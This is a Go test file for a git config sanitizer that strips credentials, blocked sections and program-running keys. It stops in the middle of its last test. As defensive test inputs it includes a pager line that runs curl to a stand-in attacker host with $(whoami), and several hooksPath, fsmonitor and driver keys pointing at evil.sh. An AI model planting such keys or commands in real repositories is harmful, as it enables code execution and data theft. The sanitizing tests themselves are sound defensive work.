// SPDX-FileCopyrightText: Copyright 2025 Stacklok, Inc.
// SPDX-License-Identifier: Apache-2.0

package git

import (
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSanitizeConfig(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name: "allowed sections pass through unchanged",
			input: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tfilemode = true",
				"\tbare = false",
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
				`[branch "main"]`,
				"\tremote = origin",
				"\tmerge = refs/heads/main",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tfilemode = true",
				"\tbare = false",
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
				`[branch "main"]`,
				"\tremote = origin",
				"\tmerge = refs/heads/main",
			}, "\n"),
		},
		{
			name: "blocked sections stripped entirely including alias with shell commands",
			input: strings.Join([]string{
				"[core]",
				"\tbare = false",
				"[alias]",
				"\tco = !git checkout",
				"\tst = status",
				"[credential]",
				"\thelper = store",
				"[color]",
				"\tui = auto",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
				"[color]",
				"\tui = auto",
			}, "\n"),
		},
		{
			name: "case-insensitive blocking",
			input: strings.Join([]string{
				"[CREDENTIAL]",
				"\thelper = store",
				"[Http]",
				"\tsslVerify = false",
				"[core]",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "subsection does not affect section name blocking",
			input: strings.Join([]string{
				`[credential "https://github.com"]`,
				"\thelper = osxkeychain",
				"[core]",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "includeIf correctly blocked",
			input: strings.Join([]string{
				`[includeIf "gitdir:/home/user/work/"]`,
				"\tpath = /home/user/.gitconfig-work",
				"[core]",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "URL credentials removed from remote",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://user:token@github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
		},
		{
			name: "SCP-like URLs pass through",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = git@github.com:org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = git@github.com:org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
		},
		{
			name: "ssh scheme URL with username preserved",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = ssh://git@github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = ssh://git@github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
		},
		{
			name: "ssh scheme URL with password stripped",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = ssh://deploy:token@github.com/org/repo.git",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = ssh://github.com/org/repo.git",
			}, "\n"),
		},
		{
			name: "malformed HTTPS URL with credentials fail closed",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = http{s://user:pass@github.com/org/repo.git",
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\tfetch = +refs/heads/*:refs/remotes/origin/*",
			}, "\n"),
		},
		{
			name: "user section name and email pass through signingkey stripped",
			input: strings.Join([]string{
				"[user]",
				"\tname = John Doe",
				"\temail = john@example.com",
				"\tsigningkey = ABCDEF1234567890",
			}, "\n"),
			expected: strings.Join([]string{
				"[user]",
				"\tname = John Doe",
				"\temail = john@example.com",
			}, "\n"),
		},
		{
			name: "backslash continuation stays in same section context",
			input: strings.Join([]string{
				"[core]",
				"\twhitespace = trailing-space, \\",
				"\tspace-before-tab",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\twhitespace = trailing-space, \\",
				"\tspace-before-tab",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "backslash continuation fake section inside continued value is not parsed as header",
			input: strings.Join([]string{
				"[core]",
				"\twhitespace = some-value \\",
				"[credential]",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\twhitespace = some-value \\",
				"[credential]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name:     "empty input produces empty output",
			input:    "",
			expected: "",
		},
		{
			name: "comments and blank lines preserved in allowed sections dropped in blocked",
			input: strings.Join([]string{
				"[core]",
				"\t# This is a comment",
				"\tbare = false",
				"",
				"[credential]",
				"\t# Credential comment",
				"\thelper = store",
				"",
				"[color]",
				"\t; semicolon comment",
				"\tui = auto",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\t# This is a comment",
				"\tbare = false",
				"",
				"[color]",
				"\t; semicolon comment",
				"\tui = auto",
			}, "\n"),
		},
		{
			name: "unknown sections not in either list are dropped fail-safe",
			input: strings.Join([]string{
				"[core]",
				"\tbare = false",
				"[somethingnew]",
				"\tkey = value",
				"[color]",
				"\tui = auto",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
				"[color]",
				"\tui = auto",
			}, "\n"),
		},
		{
			name: "submodule URL sanitization works like remote",
			input: strings.Join([]string{
				`[submodule "lib"]`,
				"\tpath = lib",
				"\turl = https://user:pass@github.com/org/lib.git",
			}, "\n"),
			expected: strings.Join([]string{
				`[submodule "lib"]`,
				"\tpath = lib",
				"\turl = https://github.com/org/lib.git",
			}, "\n"),
		},
		{
			name: "core exec-class keys stripped (sshCommand, pager, editor, fsmonitor, alternateRefsCommand, hooksPath)",
			input: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tsshCommand = ssh -i /workspace/evil-key",
				"\tpager = !curl attacker.example/$(whoami)",
				"\teditor = vim",
				"\tfsmonitor = /workspace/evil.sh",
				"\talternateRefsCommand = /workspace/evil.sh",
				"\thooksPath = /workspace/.evil-hooks",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "core exec-class denial is case-insensitive",
			input: strings.Join([]string{
				"[core]",
				"\tSSHCOMMAND = ssh -i /evil",
				"\tHooksPath = /evil",
				"\tPager = evil",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "merge driver key stripped",
			input: strings.Join([]string{
				`[merge "evil"]`,
				"\tname = pretend-merger",
				"\tdriver = /workspace/evil.sh %O %A %B",
				"\trecursive = binary",
			}, "\n"),
			expected: strings.Join([]string{
				`[merge "evil"]`,
				"\tname = pretend-merger",
				"\trecursive = binary",
			}, "\n"),
		},
		{
			name: "diff exec-class keys stripped (external, driver, textconv, command)",
			input: strings.Join([]string{
				"[diff]",
				"\talgorithm = patience",
				"\texternal = /workspace/evil.sh",
				`[diff "pdf"]`,
				"\ttextconv = /workspace/pdftotext-evil",
				"\tdriver = /workspace/evil.sh",
				"\tcommand = /workspace/evil.sh",
				"\tbinary = true",
			}, "\n"),
			expected: strings.Join([]string{
				"[diff]",
				"\talgorithm = patience",
				`[diff "pdf"]`,
				"\tbinary = true",
			}, "\n"),
		},
		{
			name: "submodule update=!cmd stripped (CVE-2017-1000117 class)",
			input: strings.Join([]string{
				`[submodule "lib"]`,
				"\tpath = lib",
				"\turl = https://github.com/org/lib.git",
				"\tupdate = !/workspace/evil.sh",
				"\tbranch = main",
			}, "\n"),
			expected: strings.Join([]string{
				`[submodule "lib"]`,
				"\tpath = lib",
				"\turl = https://github.com/org/lib.git",
				"\tbranch = main",
			}, "\n"),
		},
		{
			name: "lfs custom transfer path stripped (section not allowlisted)",
			input: strings.Join([]string{
				"[core]",
				"\tbare = false",
				`[lfs "customtransfer.evil"]`,
				"\tpath = /workspace/evil.sh",
				"\targs = --run",
				`[lfs "extension.bad"]`,
				"\tclean = /workspace/evil-clean.sh",
				"\tsmudge = /workspace/evil-smudge.sh",
				"[color]",
				"\tui = auto",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
				"[color]",
				"\tui = auto",
			}, "\n"),
		},
		{
			name: "continuation lines after denied key are dropped too",
			input: strings.Join([]string{
				"[core]",
				"\tsshCommand = ssh \\",
				"\t-i /workspace/evil-key \\",
				"\t-o StrictHostKeyChecking=no",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "continuation is reset after a benign kept line inside same section",
			input: strings.Join([]string{
				"[core]",
				"\tsshCommand = ssh \\",
				"\t-i /evil",
				"\twhitespace = trailing-space, \\",
				"\tspace-before-tab",
				"\tbare = false",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\twhitespace = trailing-space, \\",
				"\tspace-before-tab",
				"\tbare = false",
			}, "\n"),
		},
		{
			name: "benign core keys not in denylist pass through",
			input: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tfilemode = true",
				"\tbare = false",
				"\tlogallrefupdates = true",
				"\tignorecase = false",
				"\tprecomposeunicode = true",
				"\tautocrlf = false",
				"\tquotepath = true",
				"\twhitespace = trailing-space",
			}, "\n"),
			expected: strings.Join([]string{
				"[core]",
				"\trepositoryformatversion = 0",
				"\tfilemode = true",
				"\tbare = false",
				"\tlogallrefupdates = true",
				"\tignorecase = false",
				"\tprecomposeunicode = true",
				"\tautocrlf = false",
				"\tquotepath = true",
				"\twhitespace = trailing-space",
			}, "\n"),
		},
		{
			name: "remote pushurl is also sanitized",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
				"\tpushurl = https://deploy:token@github.com/org/repo.git",
			}, "\n"),
			expected: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
				"\tpushurl = https://github.com/org/repo.git",
			}, "\n"),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result := SanitizeConfig(tt.input)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestProcess_ReadsAndWritesSanitizedConfig(t *testing.T) {
	t.Parallel()

	originalDir := t.TempDir()
	snapshotDir := t.TempDir()

	// Set up .git/config in the original workspace.
	gitDir := filepath.Join(originalDir, ".git")
	require.NoError(t, os.MkdirAll(gitDir, 0o755))

	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
		`[remote "origin"]`,
		"\turl = https://user:token@github.com/org/repo.git",
	}, "\n")
	require.NoError(t, os.WriteFile(filepath.Join(gitDir, "config"), []byte(configContent), 0o644))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// Read the sanitized config from the snapshot.
	configPath := filepath.Join(snapshotDir, ".git", "config")
	result, err := os.ReadFile(configPath)
	require.NoError(t, err)

	expected := strings.Join([]string{
		"[core]",
		"\tbare = false",
		`[remote "origin"]`,
		"\turl = https://github.com/org/repo.git",
	}, "\n")
	assert.Equal(t, expected, string(result))

	// Verify config is world-readable (0644) since credentials are stripped.
	info, err := os.Stat(configPath)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o644), info.Mode().Perm(),
		"sanitized config should be world-readable (0644)")
}

func TestProcess_NoGitConfig_NoOp(t *testing.T) {
	t.Parallel()

	originalDir := t.TempDir()
	snapshotDir := t.TempDir()

	// No .git directory at all.
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// Snapshot should not have a .git directory.
	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "config"))
	assert.True(t, os.IsNotExist(err))
}

func TestContainsCredentials(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name: "URL with user:token detects credential",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://user:token@github.com/org/repo.git",
			}, "\n"),
			expected: true,
		},
		{
			name: "credential section header detected",
			input: strings.Join([]string{
				"[credential]",
				"\thelper = store",
			}, "\n"),
			expected: true,
		},
		{
			name: "credential subsection header detected",
			input: strings.Join([]string{
				`[credential "https://github.com"]`,
				"\thelper = osxkeychain",
			}, "\n"),
			expected: true,
		},
		{
			name: "pushurl with deploy:token detects credential",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\tpushurl = https://deploy:token@github.com/org/repo.git",
			}, "\n"),
			expected: true,
		},
		{
			name: "SCP-style SSH remote is not a credential",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = git@github.com:org/repo.git",
			}, "\n"),
			expected: false,
		},
		{
			name: "HTTPS without credentials is clean",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = https://github.com/org/repo.git",
			}, "\n"),
			expected: false,
		},
		{
			name: "ssh scheme URL with username only is not a credential",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = ssh://git@github.com/org/repo.git",
			}, "\n"),
			expected: false,
		},
		{
			name: "credentials in comment are ignored",
			input: strings.Join([]string{
				"[core]",
				"\t# url = https://user:token@github.com/org/repo.git",
				"\tbare = false",
			}, "\n"),
			expected: false,
		},
		{
			name: "url section with insteadOf credential detected",
			input: strings.Join([]string{
				`[url "https://user:token@github.com/"]`,
				"\tinsteadOf = https://github.com/",
			}, "\n"),
			expected: true,
		},
		{
			name: "url section without credentials is clean",
			input: strings.Join([]string{
				`[url "https://github.com/"]`,
				"\tinsteadOf = git://github.com/",
			}, "\n"),
			expected: false,
		},
		{
			name: "malformed URL with credentials detected via heuristic",
			input: strings.Join([]string{
				`[remote "origin"]`,
				"\turl = http{s://user:pass@github.com/org/repo.git",
			}, "\n"),
			expected: true,
		},
		{
			name:     "credentials detected with Windows line endings",
			input:    "[remote \"origin\"]\r\n\turl = https://user:token@github.com/org/repo.git\r\n",
			expected: true,
		},
		{
			name:     "empty input returns false",
			input:    "",
			expected: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			result := containsCredentials(tt.input)
			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestContainsCredentials_FileHandling(t *testing.T) {
	t.Parallel()

	t.Run("nonexistent file returns false nil", func(t *testing.T) {
		t.Parallel()
		hasCreds, err := ContainsCredentials(filepath.Join(t.TempDir(), "nonexistent"))
		require.NoError(t, err)
		assert.False(t, hasCreds)
	})

	t.Run("file with credentials returns true", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		configPath := filepath.Join(dir, "config")
		content := strings.Join([]string{
			`[remote "origin"]`,
			"\turl = https://user:token@github.com/org/repo.git",
		}, "\n")
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		hasCreds, err := ContainsCredentials(configPath)
		require.NoError(t, err)
		assert.True(t, hasCreds)
	})

	t.Run("clean file returns false", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		configPath := filepath.Join(dir, "config")
		content := strings.Join([]string{
			"[core]",
			"\tbare = false",
			`[remote "origin"]`,
			"\turl = https://github.com/org/repo.git",
		}, "\n")
		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))

		hasCreds, err := ContainsCredentials(configPath)
		require.NoError(t, err)
		assert.False(t, hasCreds)
	})
}

func TestResolveGitConfigPath(t *testing.T) {
	t.Parallel()

	t.Run("normal repo returns .git/config", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		gitDir := filepath.Join(dir, ".git")
		require.NoError(t, os.MkdirAll(gitDir, 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(gitDir, "config"), []byte("[core]\n"), 0o644))

		path, err := resolveGitConfigPath(dir)
		require.NoError(t, err)
		assert.Equal(t, filepath.Join(gitDir, "config"), path)
	})

	t.Run("no git returns empty", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()

		path, err := resolveGitConfigPath(dir)
		require.NoError(t, err)
		assert.Empty(t, path)
	})

	t.Run("worktree resolves through commondir", func(t *testing.T) {
		t.Parallel()

		// Set up a main repo .git directory.
		mainRepo := t.TempDir()
		mainGitDir := filepath.Join(mainRepo, ".git")
		require.NoError(t, os.MkdirAll(filepath.Join(mainGitDir, "worktrees", "wt1"), 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
		require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "config"), []byte("[core]\n\tbare = false\n"), 0o644))

		// Set up commondir in the worktree gitdir.
		wtGitDir := filepath.Join(mainGitDir, "worktrees", "wt1")
		require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "commondir"), []byte("../..\n"), 0o644))

		// Set up worktree workspace with .git file.
		wtWorkspace := t.TempDir()
		require.NoError(t, os.WriteFile(
			filepath.Join(wtWorkspace, ".git"),
			[]byte("gitdir: "+wtGitDir+"\n"),
			0o644,
		))

		path, err := resolveGitConfigPath(wtWorkspace)
		require.NoError(t, err)
		assert.Equal(t, filepath.Join(mainGitDir, "config"), path)
	})

	t.Run("worktree with relative commondir", func(t *testing.T) {
		t.Parallel()

		mainRepo := t.TempDir()
		mainGitDir := filepath.Join(mainRepo, ".git")
		require.NoError(t, os.MkdirAll(filepath.Join(mainGitDir, "worktrees", "wt1"), 0o755))
		require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
		require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "config"), []byte("[core]\n"), 0o644))

		wtGitDir := filepath.Join(mainGitDir, "worktrees", "wt1")
		// Relative commondir (standard git worktree layout).
		require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "commondir"), []byte("../.."), 0o644))

		wtWorkspace := t.TempDir()
		require.NoError(t, os.WriteFile(
			filepath.Join(wtWorkspace, ".git"),
			[]byte("gitdir: "+wtGitDir+"\n"),
			0o644,
		))

		path, err := resolveGitConfigPath(wtWorkspace)
		require.NoError(t, err)
		assert.Equal(t, filepath.Join(mainGitDir, "config"), path)
	})

	t.Run("malformed .git file returns error", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		require.NoError(t, os.WriteFile(filepath.Join(dir, ".git"), []byte("garbage content\n"), 0o644))

		_, err := resolveGitConfigPath(dir)
		assert.Error(t, err)
		assert.Contains(t, err.Error(), "malformed .git file")
	})

	t.Run("worktree without commondir falls back to gitdir/config", func(t *testing.T) {
		t.Parallel()

		// Set up a gitdir without a commondir file (e.g. submodule).
		gitdir := t.TempDir()
		require.NoError(t, os.WriteFile(filepath.Join(gitdir, "config"), []byte("[core]\n"), 0o644))

		wtWorkspace := t.TempDir()
		require.NoError(t, os.WriteFile(
			filepath.Join(wtWorkspace, ".git"),
			[]byte("gitdir: "+gitdir+"\n"),
			0o644,
		))

		path, err := resolveGitConfigPath(wtWorkspace)
		require.NoError(t, err)
		assert.Equal(t, filepath.Join(gitdir, "config"), path)
	})

	t.Run("broken gitdir path returns error", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		require.NoError(t, os.WriteFile(
			filepath.Join(dir, ".git"),
			[]byte("gitdir: /nonexistent/path/that/does/not/exist\n"),
			0o644,
		))

		// commondir won't exist → falls back to gitdir/config, which also
		// won't exist. resolveGitConfigPath still returns a path (it doesn't
		// verify the config file exists — that's Process's job).
		path, err := resolveGitConfigPath(dir)
		require.NoError(t, err)
		assert.Equal(t, "/nonexistent/path/that/does/not/exist/config", path)
	})
}

func TestProcess_ExternalWorktree_SkipsSanitization(t *testing.T) {
	t.Parallel()

	// Set up a main repo with .git directory OUTSIDE the workspace.
	mainRepo := t.TempDir()
	mainGitDir := filepath.Join(mainRepo, ".git")
	require.NoError(t, os.MkdirAll(filepath.Join(mainGitDir, "worktrees", "wt1"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))

	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
	}, "\n")
	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "config"), []byte(configContent), 0o644))

	wtGitDir := filepath.Join(mainGitDir, "worktrees", "wt1")
	require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "commondir"), []byte("../.."), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "HEAD"), []byte("ref: refs/heads/feature-wt1\n"), 0o644))

	// Original workspace: .git is a file pointing OUTSIDE the workspace.
	originalDir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(originalDir, ".git"),
		[]byte("gitdir: "+wtGitDir+"\n"),
		0o644,
	))

	// Snapshot: also has .git as a file (copied by snapshot walker).
	snapshotDir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("gitdir: "+wtGitDir+"\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// The .git file should be PRESERVED (not replaced with a directory).
	// This is the key behavioral change — we no longer destroy worktree pointers.
	info, err := os.Lstat(filepath.Join(snapshotDir, ".git"))
	require.NoError(t, err)
	assert.False(t, info.IsDir(), ".git should remain a file for external worktrees")
}

func TestProcess_InWorkspaceWorktree_SanitizesConfig(t *testing.T) {
	t.Parallel()

	// Simulate Claude Code's pattern: workspace root is a normal repo,
	// worktree is inside .claude/worktrees/. This tests the case where
	// the workspace ROOT is a worktree that points back INTO the workspace.

	// Create a workspace that IS a worktree pointing to a gitdir within itself.
	workspace := t.TempDir()

	// Set up the main .git structure at workspace/.git-main (simulating
	// a layout where the main repo's git dir is inside the workspace).
	mainGitDir := filepath.Join(workspace, ".git-main")
	require.NoError(t, os.MkdirAll(filepath.Join(mainGitDir, "worktrees", "wt1"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))

	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
		`[remote "origin"]`,
		"\turl = https://user:token@github.com/org/repo.git",
	}, "\n")
	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "config"), []byte(configContent), 0o644))

	wtGitDir := filepath.Join(mainGitDir, "worktrees", "wt1")
	require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "commondir"), []byte("../.."), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(wtGitDir, "HEAD"), []byte("ref: refs/heads/feature\n"), 0o644))

	// The workspace .git file points to the in-workspace gitdir (absolute path).
	require.NoError(t, os.WriteFile(
		filepath.Join(workspace, ".git"),
		[]byte("gitdir: "+wtGitDir+"\n"),
		0o644,
	))

	// Create snapshot with the same structure.
	snapshotDir := t.TempDir()
	snapshotMainGitDir := filepath.Join(snapshotDir, ".git-main")
	require.NoError(t, os.MkdirAll(filepath.Join(snapshotMainGitDir, "worktrees", "wt1"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotMainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotMainGitDir, "config"), []byte(configContent), 0o644))

	snapshotWtGitDir := filepath.Join(snapshotMainGitDir, "worktrees", "wt1")
	require.NoError(t, os.WriteFile(filepath.Join(snapshotWtGitDir, "commondir"), []byte("../.."), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(snapshotWtGitDir, "HEAD"), []byte("ref: refs/heads/feature\n"), 0o644))

	// Snapshot .git file points to the original workspace path (as copied).
	require.NoError(t, os.WriteFile(
		filepath.Join(snapshotDir, ".git"),
		[]byte("gitdir: "+wtGitDir+"\n"),
		0o644,
	))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), workspace, snapshotDir)
	require.NoError(t, err)

	// The .git file should remain a file (not converted to directory).
	info, err := os.Lstat(filepath.Join(snapshotDir, ".git"))
	require.NoError(t, err)
	assert.False(t, info.IsDir(), ".git should remain a file for worktrees")

	// The config in the snapshot's main git dir should be sanitized.
	result, err := os.ReadFile(filepath.Join(snapshotMainGitDir, "config"))
	require.NoError(t, err)

	expected := strings.Join([]string{
		"[core]",
		"\tbare = false",
		`[remote "origin"]`,
		"\turl = https://github.com/org/repo.git",
	}, "\n")
	assert.Equal(t, expected, string(result))
}

func TestProcess_ExternalWorktreeNoCommondir_SkipsSanitization(t *testing.T) {
	t.Parallel()

	// Set up a gitdir without commondir (e.g. submodule) OUTSIDE workspace.
	gitdir := t.TempDir()
	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
	}, "\n")
	require.NoError(t, os.WriteFile(filepath.Join(gitdir, "config"), []byte(configContent), 0o644))

	// Original workspace: .git is a file pointing to external gitdir.
	originalDir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(originalDir, ".git"),
		[]byte("gitdir: "+gitdir+"\n"),
		0o644,
	))

	// Snapshot has no .git (it was a file pointing outside, snapshot may
	// or may not have it depending on whether it was excluded).
	snapshotDir := t.TempDir()

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// No config should be written for external worktrees.
	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "config"))
	assert.True(t, os.IsNotExist(err), "should not create config for external worktree")
}

func TestProcess_NormalRepo_NoDoubleCreate(t *testing.T) {
	t.Parallel()

	originalDir := t.TempDir()
	snapshotDir := t.TempDir()

	// Set up a normal repo with .git directory containing HEAD.
	gitDir := filepath.Join(originalDir, ".git")
	require.NoError(t, os.MkdirAll(gitDir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(gitDir, "config"), []byte("[core]\n\tbare = false\n"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(gitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// For normal repos, Process should NOT create HEAD/objects/refs
	// (those come from the snapshot walker, not the sanitizer).
	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "HEAD"))
	assert.True(t, os.IsNotExist(err), "HEAD should not be created for normal repos")

	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "objects"))
	assert.True(t, os.IsNotExist(err), "objects/ should not be created for normal repos")

	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "refs"))
	assert.True(t, os.IsNotExist(err), "refs/ should not be created for normal repos")
}

func TestProcess_Worktree_MaliciousGitdir(t *testing.T) {
	t.Parallel()

	// A .git file pointing to an arbitrary external path.
	// The sanitizer should skip since the gitdir is outside the workspace.
	fakeGitdir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(fakeGitdir, "config"),
		[]byte("[core]\n\tbare = false\n"),
		0o644,
	))

	originalDir := t.TempDir()
	require.NoError(t, os.WriteFile(
		filepath.Join(originalDir, ".git"),
		[]byte("gitdir: "+fakeGitdir+"\n"),
		0o644,
	))

	snapshotDir := t.TempDir()

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	sanitizer := NewConfigSanitizer(logger)

	// Process should succeed — external worktrees are skipped.
	_, err := sanitizer.Process(t.Context(), originalDir, snapshotDir)
	require.NoError(t, err)

	// No config should be written since gitdir is external.
	_, err = os.Stat(filepath.Join(snapshotDir, ".git", "config"))
	assert.True(t, os.IsNotExist(err), "should not create config for external gitdir")
}

func TestProcess_InWorkspaceWorktree_RelativeGitdir(t *testing.T) {
	t.Parallel()

	// Create a workspace where .git is a file with a RELATIVE gitdir path.
	workspace := t.TempDir()

	// Main git dir inside workspace at .git-main/
	mainGitDir := filepath.Join(workspace, ".git-main")
	require.NoError(t, os.MkdirAll(filepath.Join(mainGitDir, "worktrees", "wt1"), 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(mainGitDir, "HEAD"), []byte("ref: refs/heads/main\n"), 0o644))

	configContent := strings.Join([]string{
		"[core]",
		"\tbare = false",
		"[credential]",
		"\thelper = store",
	}, "\n")
